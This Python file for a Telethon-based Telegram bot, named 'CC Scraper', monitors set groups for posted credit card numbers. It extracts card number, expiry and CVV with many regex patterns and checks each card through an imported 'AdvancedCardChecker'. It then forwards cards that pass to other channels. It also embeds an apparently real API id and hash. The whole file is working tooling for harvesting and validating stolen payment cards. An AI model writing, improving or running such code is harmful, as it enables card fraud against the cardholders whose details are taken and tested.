import re
import asyncio
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from app import AdvancedCardChecker  # Import AdvancedCardChecker from app.py
import logging

# Configure logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# API Configuration
api_id = 25031007  # Replace with your actual API ID
api_hash = "68029e5e2d9c4dd11f600e1692c3acaa"  # Replace with your actual API hash
session_name = "cc_scraper"
# Add your session string here (optional); leave as None if using session file or manual login
session_string = None  # Replace with your session string, e.g., "1BVtsO..."

# Sources Configuration - add as many as needed
source_groups = [-1002410570317]  # Add source group IDs if needed
source_channels = []  # Add source channel IDs if needed

# Target channels where approved CCs will be sent
target_channels = [-1002319403142]  # Add more channel IDs as needed

# Initialize Telegram client
if session_string:
    client = TelegramClient(StringSession(session_string), api_id, api_hash)
else:
    client = TelegramClient(session_name, api_id, api_hash)

# Initialize card checker
card_checker = AdvancedCardChecker()

# Enhanced CC patterns to capture more formats
cc_patterns = [
    r'(\d{13,16})[\s|/|\-|~]?\s*(\d{1,2})[\s|/|\-|~]?\s*(\d{2,4})[\s|/|\-|~]?\s*(\d{3,4})',
    r'(\d{13,16})\s(\d{1,2})\s(\d{2,4})\s(\d{3,4})',
    r'(\d{13,16})\n(\d{1,2})\n(\d{2,4})\n(\d{3,4})',
    r'(\d{13,16})\n(\d{1,2})[/|-](\d{2,4})\n(\d{3,4})',
    r'(\d{13,16})[:|=|>]?(\d{1,2})[:|=|>]?(\d{2,4})[:|=|>]?(\d{3,4})',
    r'(\d{13,16})\|(\d{1,2})\|(\d{2,4})\|(\d{3,4})',
    r'cc(?:num)?:[\s]?(\d{13,16})[\s\n]+(?:exp|expiry|expiration):[\s]?(\d{1,2})[/|-](\d{2,4})[\s\n]+(?:cvv|cvc|cv2):[\s]?(\d{3,4})',
    r'(?:cc|card)(?:num)?[\s:]+(\d{13,16})[\s\n]+(?:exp|expiry|expiration)[\s:]+(\d{1,2})[/|-](\d{2,4})[\s\n]+(?:cvv|cvc|cv2)[\s:]+(\d{3,4})',
    r'(\d{13,16})(?:\s*(?:card|exp|expiry|expiration)\s*(?:date)?\s*[:|=|-|>])?\s*(\d{1,2})(?:\s*[/|-])?\s*(\d{2,4})(?:\s*(?:cvv|cvc|cv2)\s*[:|=|-|>])?\s*(\d{3,4})',
    r'(?:.*?:)?\s*(\d{13,16})\s*(?:\n|\r\n|\r)(?:.*?)?(\d{1,2})[/|-](\d{2}|20\d{2})(?:\n|\r\n|\r)(\d{3,4})(?:.*)',
    r'(?:.*?:)?\s*(\d{13,16})\|(\d{1,2})\|(\d{2})\|(\d{3,4})(?:\|.*)?',
    r'(?:.*?)NR:?\s*(\d{13,16})(?:.*?)EXPIRE:?\s*(\d{1,2})[/|-](\d{2}|20\d{2})(?:.*?)CVV:?\s*(\d{3,4})(?:.*)',
    r'(?:.*?)CVV:?\s*(\d{3,4})(?:.*?)EXPIRE:?\s*(\d{1,2})[/|-](\d{2}|20\d{2})(?:.*?)NR:?\s*(\d{13,16})(?:.*)',
    r'(?:.*?)(\d{13,16})(?:.*?)(\d{1,2})[/|-](\d{2}|20\d{2})(?:.*?)(\d{3,4})(?:.*)',
]

# Format CC to desired format
def format_cc(match):
    groups = match.groups()
    if len(groups) == 4:
        if len(groups[2]) >= 3 and len(groups[2]) <= 4 and len(groups[3]) == 2:
            cc, cvv, mm, yy = groups
        else:
            cc, mm, yy, cvv = groups
    else:
        return None
    
    cc = cc.strip()
    mm = mm.strip().zfill(2)
    yy = yy.strip()
    if len(yy) == 4:
        yy = yy[-2:]
    cvv = cvv.strip()
    
    if not (13 <= len(cc) <= 19) or not (3 <= len(cvv) <= 4):
        return None
        
    return f"{cc}|{mm}|{yy}|{cvv}"

# Define sources handler
def get_sources():
    sources = []
    if source_groups:
        sources.extend(source_groups)
    if source_channels:
        sources.extend(source_channels)
    return sources

# Scraper Event Handler
@client.on(events.NewMessage(chats=get_sources() if get_sources() else None))
async def cc_scraper(event):
    text = event.raw_text
    found_ccs = set()

    for pattern in cc_patterns:
        for match in re.finditer(pattern, text):
            formatted_cc = format_cc(match)
            if formatted_cc:
                found_ccs.add(formatted_cc)

    if found_ccs:
        for cc in found_ccs:
            try:
                # Check the card using AdvancedCardChecker
                result = await card_checker.check_card(cc)
                if result:
                    # Card is approved, send the formatted message to target channels
                    message = result['message']
                    for channel_id in target_channels:
                        try:
                            await client.send_message(channel_id, message, parse_mode="HTML")
                            logger.info(f"Sent approved CC {cc} to channel {channel_id}")
                        except Exception as e:
                            logger.error(f"Error sending to channel {channel_id}: {str(e)}")
                else:
                    logger.info(f"CC {cc} declined, not sent to channel")
            except Exception as e:
                logger.error(f"Error checking CC {cc}: {str(e)}")

# Run Client
async def main():
    try:
        await client.start()
        print("✅ CC Scraper Running...")
        
        sources = get_sources()
        if sources:
            print(f"✅ Monitoring {len(sources)} source(s)")
        else:
            print("⚠️ No sources specified. Will monitor all chats the account has access to.")
        
        if target_channels:
            print(f"✅ Approved CCs will be sent to {len(target_channels)} channel(s)")
        else:
            print("⚠️ No target channels specified. Approved CCs will be printed to console only.")
        
        await client.run_until_disconnected()
    except Exception as e:
        logger.error(f"Error starting client: {str(e)}")
        print(f"❌ Failed to start scraper: {str(e)}")

if __name__ == "__main__":
    asyncio.run(main())
